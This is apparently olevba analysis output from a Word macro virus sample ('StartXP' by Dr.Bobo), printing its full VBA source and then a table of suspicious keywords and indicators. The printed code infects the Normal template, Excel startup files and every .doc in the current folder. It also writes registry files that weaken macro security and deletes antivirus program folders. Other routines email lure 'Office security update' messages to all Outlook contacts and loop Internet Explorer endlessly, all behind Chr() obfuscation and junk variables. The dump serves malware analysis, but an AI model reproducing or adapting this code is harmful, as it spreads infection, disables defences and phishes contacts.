olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPCK1.ec
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPCK1.ec - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO StartXP.bas 
in file: Virus.MSWord.VMPCK1.ec - OLE stream: 'Macros/VBA/startXP'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' W97/W2000/XP.StartXP
'By Dr.Bobo
'Dr.Bobo (bobo_dr@antionline.org)
'For virii.com.hr
' http://www.virii.com.hr

Public Skip As Integer
    
Private Sub Document_Open()
On Error Resume Next
Set a = Application: e = a.Version:
wo = Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(87) + Chr(111) + Chr(114) + Chr(107) + Chr(98) + Chr(111) + Chr(111) + Chr(107)
If a = Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) Then
p = 0
Set act = ActiveWorkbook.VBProject.VBComponents(wo).CodeModule
Set dis = ThisWorkbook.VBProject.VBComponents(wo).CodeModule
End If
p = 1
Set act = ActiveDocument.VBProject.VBComponents.Item(p).CodeModule
Set dis = NormalTemplate.VBProject.VBComponents.Item(p).CodeModule
dis.deletelines 1, dis.countoflines
dis.insertlines 1, act.Lines(1, act.countoflines)
dis.Save
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeForeColors") = "1 1 1 0 1 1 1 1 0 0 0 0 0 0 0 0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeBackColors") = "1 1 0 1 1 0 0 0 0 0 0 0 0 0 0 0"

End If
End If
act.deletelines 1, act.countoflines
act.insertlines 1, dis.Lines(1, dis.countoflines)
If a = Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) Then
ActiveWorkbook.Save
Else
ActiveDocument.SaveAs ActiveDocument.FullName
End If
End If
If a = Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) Then
Drop = "true"
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
crossQuit = True
Set ohio = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
WordObj.Options.SaveNormalPrompt = False
ohio.deletelines 1, ohio.countoflines
ohio.insertlines 1, dis.Lines(1, dis.countoflines)
ohio.Replaceline 1, "Private Sub Document_Open"
ohio.Save
End If
If crossQuit = True Then WordObj.Quit
End If
End If
ra = Dir("c:\fucker.reg")
If ra = "" Then Drop = "true"
Set xlapp = CreateObject("Excel.Application")
Set book1Obj = xlapp.Workbooks.Add
chk = Dir(xlapp.Application.StartupPath & "\Book1.xls")
If chk = "" Then
book1Obj.VBProject.VBComponents.Item(wo).CodeModule.insertlines 1, dis.Lines(1, dis.countoflines)
book1Obj.VBProject.VBComponents.Item(wo).CodeModule.Replaceline 1, "Private Sub Workbook_Deactivate()"
book1Obj.SaveAs xlapp.Application.StartupPath & "\Book1.xls"
book1Obj.Close
Drop = "true"
End If
xlapp.Quit

End If
hd300:
If Drop = "true" Then
Open "c:\base.reg" For Output As 1
Print #1, Chr(82) + Chr(69) + Chr(71) + Chr(69) + Chr(68) + Chr(73) + Chr(84) + Chr(52)
Print #1, Chr(91) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78) + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) + Chr(99) + Chr(101) + Chr(92) + Chr(56) + Chr(46) + Chr(48) + Chr(92) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) + Chr(93)
Print #1, """Options6""=dword:00000000"
Print #1, Chr(91) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78) + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) + Chr(99) + Chr(101) + Chr(92) + Chr(57) + Chr(46) + Chr(48) + Chr(92) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(93)
Print #1, """Level""=dword:00000001"
Print #1, Chr(91) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78) + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) + Chr(99) + Chr(101) + Chr(92) + Chr(49) + Chr(48) + Chr(46) + Chr(48) + Chr(92) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(93)
Print #1, """Level""=dword:00000001"
Print #1, Chr(91) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(76) + Chr(79) + Chr(67) + Chr(65) + Chr(76) + Chr(95) + Chr(77) + Chr(65) + Chr(67) + Chr(72) + Chr(73) + Chr(78) + Chr(69) + Chr(92) + Chr(83) + Chr(111) + Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) + Chr(99) + Chr(101) + Chr(92) + Chr(49) + Chr(48) + Chr(46) + Chr(48) + Chr(92) + Chr(69) + Chr(120) + Chr(99) + Chr(101) + Chr(108) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(93)
Print #1, """AccessVBOM""=dword:00000001"
Print #1, Chr(91) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78) + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) + Chr(99) + Chr(101) + Chr(92) + Chr(49) + Chr(48) + Chr(46) + Chr(48) + Chr(92) + Chr(87) + Chr(111) + Chr(114) + Chr(100) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(93)
Print #1, """Level""=dword:00000001"
Print #1, Chr(91) + Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(76) + Chr(79) + Chr(67) + Chr(65) + Chr(76) + Chr(95) + Chr(77) + Chr(65) + Chr(67) + Chr(72) + Chr(73) + Chr(78) + Chr(69) + Chr(92) + Chr(83) + Chr(111) + Chr(102) + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105) + Chr(99) + Chr(101) + Chr(92) + Chr(49) + Chr(48) + Chr(46) + Chr(48) + Chr(92) + Chr(87) + Chr(111) + Chr(114) + Chr(100) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(93)
Print #1, """AccessVBOM""=dword:00000001"
Close 1
Shell "regedit /s c:\Sadew.reg", vbHide
End If
CommandBars("Tools").Controls("Macro").Enabled = False
Options.VirusProtection = (Rnd * 0)
End If
End Sub
Sub StartXP()
On Error Resume Next
Randomize
sv = Int(Rnd * 3) + 1
If sv = 1 Then svt$ = "teen.doc"
If sv = 3 Then svt$ = "For You.doc"
If sv = 2 Then svt$ = "READ!!!!!!!!!!!!!!!!!!!.doc"
AnTs3176 = MwRfVnNr & CkTg12347 & Int(Rnd * 7319)
GuMkRvJt = QtMh11877 & IiAf14801
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("StartXP").Export "c:\StartXP.drv"
OoQj17640 = UlOxVqTy & JqTp19161 & Int(Rnd * 9400)
VfDi10082 = OlAnOzBj & AyOs9729 & Int(Rnd * 6196)
OvTp6094 = KqFqRwCj & IxFk7852 & Int(Rnd * 736)
ActiveDocument.ReadOnlyRecommended = False
RsTkGiBh = TvQm5406 & MtCo7179
HfDjLtRe = SkPe1428 & QsQr11696
TeAv2226 = HzAyKoQs & JmAo7211 & Int(Rnd * 2175)
FwBfIyHv = LwAh8631 & EnFm10077
UpHy12297 = VmFmDgGr & EfRf6899 & Int(Rnd * 5355)
MfLg = Int(Rnd * 100)
    If MfLg = 99 Then MsgBox "Dr.Bobo", vbSystemModal
If Month(Now()) = 5 And Day(Now()) = 24 Then MsgBox "((((((:", vbInformation, "Birthday Greeting!!!"
LpBh9273 = CeCnViUj & QjKg4200 & Int(Rnd * 1570)
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "Dr.Bobo"
    .Title = "virii.com.hr"
    .Subject = "StartXP"
    .Comments = "I love Virii!!!!!!!!!!!!! ((((((:"
    .Keywords = "W97/W2000/XP"
    .Execute
End With
JiQw13380 = HzIqHgJq & AwAz17310 & Int(Rnd * 9792)
RjOr12404 = ToPsAqDe & MjRs4032 & Int(Rnd * 8979)
IzEpHeGi = ViTk8508 & DlIo4825
If NormalTemplate.VBProject.VBComponents.Item("StartXP").Name <> "StartXP" Then AlJz61861711 = True
MlOr14726 = MlLzDiPy & KeIj13364 & Int(Rnd * 8875)
If ActiveDocument.VBProject.VBComponents.Item("StartXP").Name <> "StartXP" Then OjHg61713 = True
If AlJz61861711 = True And OjHg61713 = False Then Set UwBq6176181 = NormalTemplate.VBProject.VBComponents
If AlJz61861711 = False And OjHg61713 = True Then Set UwBq6176181 = ActiveDocument.VBProject.VBComponents
UwBq6176181.import "c:\StartXP.drv"
If AlJz61861711 = True And OjHg61713 = False Then Shell ("label c: Dr.Bobo"), 0
If AlJz61861711 = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
JxFn14142 = AvStJtAe & AgHz6264 & Int(Rnd * 2487)
OxSyJjDj = SnUq11846 & EqTy7305
HhDj7811 = UzSoIoTl & IgHw11650 & Int(Rnd * 9410)
If OjHg61713 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
KtEvTwMs = DmUq8148 & JzRm6862
QkMiRtSe = MsCn9208 & AkBj11535
            Call dhIconDisco("C:\autorun.inf")
AuTlFwRs = AtFh9972 & JpLm13727
KjEfKtIr = NqEv2510 & KoIh12134
JuFy11804 = MgOwMtHo & JwNq13119 & Int(Rnd * 5005)
SsAgKeOr = OtJs14650 & CpMe15920
DuDvIhTy:
End Sub
Sub HelpAbout()
    On Error Resume Next
QxKi8447 = HsUzHhDv & DrOm9890 & JtGwQlJs & UxCq7672
    MsgBox "Dr.Bobo", vbInformation
LhBvCpEx = SwVr12689 & GvPx12422
End Sub
Sub FileNew()
    On Error Resume Next
SyCo8592 = NnHyPoEu & OyEr9267 & VwIgRzQu & QwOh16725
    Call StartXP
RiNnOwSy = QvFn12215 & ExQj4877
FoPp18472 = MkRtDuOm & AlBf18032 & Int(Rnd * 9053)
Dialogs(wdDialogFileNew).Show
GqVe9674 = LwMiNoTw & UiUg4710 & Int(Rnd * 3047)
DgKv12162 = OrFpDzCp & JpBg6823 & Int(Rnd * 7112)
    Skip = 1
PiCl9188 = SkUgIjDo & BtAh15439 & Int(Rnd * 8166)
    Call StartXP
End Sub
Sub FileSave()
    On Error Resume Next
VzOwLzFf = QyCp9849 & RgUs4537
OqOt14842 = LeNpUxKo & IzDk9860 & Int(Rnd * 9114)
    Call StartXP
NuSmVkUz = AyMq9206 & BeVw8924
BgUlLgVr = OsCx8620 & NrOs11795
    ActiveDocument.Save
FoHn7688 = RlTpBrJh & UyQw15676 & GxGlTqFw & JgUr11179
PfIrOnEx = UvVj11100 & JyTv11717
End Sub
Sub FileClose()
    On Error Resume Next
OqFfBtUs = NvNp10289 & CuUx8037
    Call StartXP
CsHw10939 = NyAzOtFk & JoFx6743 & KhEiDzIv & DkIz8000
    If ActiveDocument.Saved = False Then ActiveDocument.Save
UzOu11807 = OrBpHvEk & DnAf7859 & Int(Rnd * 7397)
CjKh14068 = BpVnEeSt & MnBo1722 & Int(Rnd * 1634)
    ActiveDocument.Close
CyQyVnCq = PxMe12424 & HlAl7437
GvDw5854 = MrJiJjQf & ViAu15498 & Int(Rnd * 3642)
End Sub
Sub ToolsOptions()
    On Error Resume Next
DgIu10305 = GuHhLgSs & IrGv13241 & EwLzOoRm & QnOs14949
Dialogs(wdDialogToolsOptions).Show
VfEk11937 = AiTvGvHg & CwIz13310 & FsUsPyRe & HkOr6032
    Call StartXP
ShGk14771 = PjEyLjCz & PxHi10056 & Int(Rnd * 7757)
MeOzIgSw = IvIn12526 & KtBk14800
End Sub
Sub EditFind()
    On Error Resume Next
TvTz6045 = FhDyOtTm & InUw6422 & Int(Rnd * 2166)
Dialogs(wdDialogEditFind).Show
IzGqLuQr = NwSv11951 & FnBt9892
    Call StartXP
GvEmJyHm = GmDz9155 & PiNn8273
JeVe7617 = VqJzOeCt & FwUv5873 & Int(Rnd * 1849)
End Sub
Sub FileSaveAs()
    On Error Resume Next
OkEiCjCt = GsSh14420 & SqUj17593
EjTn10356 = SeCrDkQw & BgCh9527 & Int(Rnd * 7788)
Dialogs(wdDialogFileSaveAs).Show
BhKnFqLe = JgKm12301 & OyJq8247
LuNf16236 = VuTrTgVt & SsTz17344 & NzAqVmPy & DgIg7454
    Call StartXP
FgRz6595 = BjKlKmQu & SlHp11048 & HjPjMtMh & MmFp12549
End Sub
Sub FilePrint()
    On Error Resume Next
JsNq10315 = SrSlOkEr & MxNs7575 & Int(Rnd * 1307)
GxUnLoOj = AeKh14384 & EvRf8324
Dialogs(wdDialogFilePrint).Show
FzIpBxKx = NnEz13482 & VnEv19499
LrPq10827 = QuHhPgIq & FhTk4987 & Int(Rnd * 9418)
    Call StartXP
End Sub
Sub FileExit()
    On Error Resume Next
BkEm12053 = VyVlAoBr & AuDe9806 & EeCmTnUn & VoJp1860
    Call StartXP
KiUuBuCw = SqDs4510 & RoLi10126
MwHwPrCq = CjLu14092 & UiEh1067
    If ActiveDocument.Saved = False Then ActiveDocument.Save
FnEi13911 = CmOrUmMz & DiSx13272 & Int(Rnd * 7815)
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call StartXP
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call StartXP
End If
Loop
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "h:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "f:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
    Application.Quit
AgUo3507 = NgQhKeQq & EsVn18022 & Int(Rnd * 1421)
PtNl15755 = OqHeUeRp & IvSn7668 & Int(Rnd * 8135)
End Sub
Sub AutoOpen()
    On Error Resume Next
VxDmRoMj = OwCe10890 & PwQo12607
    Call StartXP
NuLi7807 = NnVpPwLz & UvNo6989 & Int(Rnd * 2436)
JuMv3295 = SiSzTrDk & PrFh8629 & Int(Rnd * 6075)
End Sub
Sub AutoExit()
    On Error Resume Next
KwNj10640 = FnGtUkGx & MxLt13735 & Int(Rnd * 1304)
DmNzVnRu = CjKf14628 & JvKu7320
    Call StartXP
HwJtOtRg = VwTg5294 & MiCu7372
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call StartXP
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call StartXP
End If
Loop
    If ActiveDocument.Saved = False Then ActiveDocument.Save
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "r:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "s:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
End Sub
Sub AutoExec()
    On Error Resume Next
JvCgJhHg = LvIn9499 & CkDt12020
ErQu2940 = ShOzBnFf & JpDg9665 & PvEtIgDp & SmUm9928
    Call StartXP
MzDy11202 = PwLyPjIf & UsNu17431 & Int(Rnd * 8206)
End Sub
Sub AutoClose()
    On Error Resume Next
OgAuVtPi = ErHu11968 & PnAj9722
OqKgSrNl = GjFh12058 & NqPr14865
    Call StartXP
CzGzDzCp = HfVz9849 & MuLq10375
HwPz11631 = KuHgViOf & QzTx10824 & Int(Rnd * 3178)
End Sub
Sub ToolsMacro()
    On Error Resume Next
CrJhFkHs = VhBr12160 & RyPq12229
IeVx10179 = SqMkLrAg & LgAo12607 & Int(Rnd * 5121)
    Call StartXP
DrQuRqEt = QoBj17086 & PeBg15415
    Call VyEm8276BxEg
RoJo15786 = CoUzEhFu & VoRs5482 & Int(Rnd * 4982)
MqDiGfSu = PsUt14786 & PeEt5780
End Sub
Sub FileTemplates()
    On Error Resume Next
HyJxVtPn = GmAu12146 & OjEi4788
EhVf12933 = NiSrKjMn & UlHh10186 & Int(Rnd * 5078)
    Call StartXP
VkBg12183 = MtGkGyEu & SyQo10305 & PiViGzJf & IoRj11165
FkAvHwOt = BtNs12563 & LpLk13846
    Call VyEm8276BxEg
VrHn17564 = JrLmSiLo & SfTz9781 & Int(Rnd * 5215)
TrRj9340 = JxKeVjBx & BrLm9227 & Int(Rnd * 5009)
End Sub
Sub ViewVBCode()
    On Error Resume Next
VtVyOxCu = MvOr8438 & NtSo14735
    Call StartXP
TuUt13613 = CuMgQzFy & VsNs5119 & MjPeQhRy & UqDy11549
    Call VyEm8276BxEg
QwAu6448 = QvTjVnAv & NuLx11864 & Int(Rnd * 4625)
IjKu7078 = PgTkNzRg & VqVf512 & Int(Rnd * 335)
BzFe13090 = LkDnQxSh & HpNt8634 & Int(Rnd * 7601)
End Sub
Sub VyEm8276BxEg()
    On Error Resume Next
KrLm9533 = CnEtEtDi & KvKp10149 & AfGfDrSh & StGw18708
PqByMyQp = EhHh7469 & UpFz5205
    ActiveDocument.FollowHyperlink Address:= _
"http://www.virii.com.hr" _
        , NewWindow:=False, AddHistory:=True
KwVl11424 = BmFwBmKg & NkSy16091 & MmVuJhGk & TtNk4673
End Sub
Sub dhIconDisco(strFile As String)
Dim hFile As Long
On Error Resume Next
Randomize
HtPn9293 = AgDjChAp & DtDo7681 & Int(Rnd * 2221)
UxVpDoCr = TyGp9938 & LsCq12907
Choice = Int(Rnd * 2)
LxRmLlRx = NfPq8213 & RxEu8182
LsIq13100 = SuJoDhIr & NlSg2853 & Int(Rnd * 8990)
rnn$ = Int(Rnd * 66) + 2
LxLn4210 = AuMoTuLk & OnUl6437 & Int(Rnd * 5488)
JqDg8316 = FtSqGrAr & VeKi9548 & Int(Rnd * 6634)
rn$ = Int(Rnd * 27) + 1
MfRl12755 = HqRsJhTm & KqBy18219 & Int(Rnd * 3047)
Part1$ = "[autorun]"
OtGjCwIs = PpLx10731 & EjNn9984
Part2$ = "icon = c:\windows\system\pifmgr.dll,"
TqDx7852 = PlOpBxUe & EsLo13681 & MrJvOfKu & HhFm11058
UwIi16815 = EuQzVzHk & TjEx9785 & Int(Rnd * 1731)
Part22$ = "icon = c:\windows\SYSTEM\shell32.dll,"
CwEq14400 = PlGhChNr & CrSn7360 & EqTfRmPe & MkDu13539
Part3$ = Part2$ + rn$
FhLoGrAe = KkRl19096 & ItIe10402
HtCp15149 = PwRnGoVk & DeKg7241 & Int(Rnd * 6123)
Part33$ = Part22$ + rnn$
    hFile = FreeFile
    Open strFile For Output Access Write As hFile
    Print #hFile, Part1$
    If Choice = 0 Then
        Print #hFile, Part3$
    Else
        Print #hFile, Part33$
    End If
    Close hFile
VyJr14161 = NzFtBsJy & QpLn4891 & Int(Rnd * 9147)
End Sub
Function PR1S8442()
On Error Resume Next
Set AO534918 = CreateObject("Outlook.Application")
If AO534918 = "Outlook" Then
Set GDL6J3CN = AO534918.GetNameSpace("MAPI")
Set U4TPU2C8 = GDL6J3CN.AddressLists
For Each SE4ON77A In U4TPU2C8
If SE4ON77A.AddressEntries.Count <> 0 Then
D017K4H4 = SE4ON77A.AddressEntries.Count
For P6HHR3L1 = 1 To D017K4H4
Set P7A33U1L = AO534918.CreateItem(0)
Set T2E99AQ6 = SE4ON77A.AddressEntries(P6HHR3L1)
P7A33U1L.To = T2E99AQ6.Address
P7A33U1L.Subject = "Update"
P7A33U1L.Body = "Update for Office!!!!" & vbCrLf & "Here is security update for Office!!!" & vbCrLf & "For all verzions of MS Office." & vbCrLf & "Run attachment ot pach Office*"
Execute "set JI1V8374 =P7A33U1L." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
GKMGC327 = D44KOQ1M
P7A33U1L.DeleteAfterSubmit = True
JI1V8374.Add GKMGC327
If P7A33U1L.To <> "" Then
P7A33U1L.Send
End If
Next
End If
End Function
Sub KillAV()
On Error Resume Next
Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
Kill "C:\eSafe\Protect\*.*"
Kill "C:\Program Files\Command Software\F-PROT\*.*"
Kill "C:\Program Files\Command Software\F-PROT95\*.*"
Kill "C:\Program Files\Command Software\F-PROT98\*.*"
Kill "C:\Program Files\Command Software\F-PROT 2000\*.*"
Kill "C:\Program Files\Command Software\F-PROT 2001\*.*"
Kill "C:\PC-Cillin\*.*"
Kill "C:\PC-Cillin 95\*.*"
Kill "C:\PC-Cillin 97\*.*"
Kill "C:\PC-Cillin 2000\*.*"
Kill "C:\PC-Cillin 2001\*.*"
Kill "C:\Program Files\Quick Heal\*.*"
Kill "C:\Program Files\FWIN32"
Kill "C:\Program Files\FindVirus\*.*"
Kill "C:\Toolkit\FindVirus\*.*"
Kill "C:\f-macro\*.*"
Kill "C:\Program Files\McAfee\VirusScan\*.*"
Kill "C:\Program Files\McAfee\VirusScan95\*.*"
Kill "C:\Program Files\McAfee\VirusScan98\*.*"
Kill "C:\Program Files\McAfee\VirusScan 2000\*.*"
Kill "C:\Program Files\McAfee\VirusScan 2001\*.*"
Kill "C:\Program Files\Norton AntiVirus\*.*"
Kill "C:\TBAVW\*.*"
Kill "C:\TBAVW95\*.*"
Kill "C:\TBAVW98\*.*"
Kill "C:\TBAVW 2000\*.*"
Kill "C:\TBAVW 2001\*.*"
Kill "C:\VS\*.*"
Kill "C:\VS95\*.*"
Kill "C:\VS98\*.*"
Kill "C:\VS 2000\*.*"
Kill "C:\VS 2001\*.*"
End Sub
Sub Crash2()
On Error Resume Next
Set j8Q4v066K5R = CreateObject("WScript.Shell")
j8Q4v066K5R.regwrite "HKCU\software\StartXP\", Chr(87) & Chr(111) & Chr(114) & Chr(109) & Chr(32) & Chr(109) & Chr(97) & Chr(100) & Chr(101) & Chr(32) & Chr(119) & Chr(105) & Chr(116) & Chr(104) & Chr(32) & Chr(86) & Chr(98) & Chr(115) & Chr(119) & Chr(103) & Chr(32) & Chr(49) & Chr(46) & Chr(53) & Chr(48) & Chr(98)
Set Ze9YN9DKS8P = CreateObject("scripting.filesystemobject")
Ze9YN9DKS8P.copyfile wscript.scriptfullname, Ze9YN9DKS8P.GetSpecialFolder(0) & "\StartXP.doc"
Do
j8Q4v066K5R.Run "iexplore", False
Loop
End If
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|copyfile            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.virii.com|URL                                          |
|          |.hr                 |                                             |
|IOC       |fucker.reg          |Executable file name                         |
|IOC       |base.reg            |Executable file name                         |
|IOC       |Sadew.reg           |Executable file name                         |
|IOC       |autorun.inf         |Executable file name                         |
|IOC       |pifmgr.dll          |Executable file name                         |
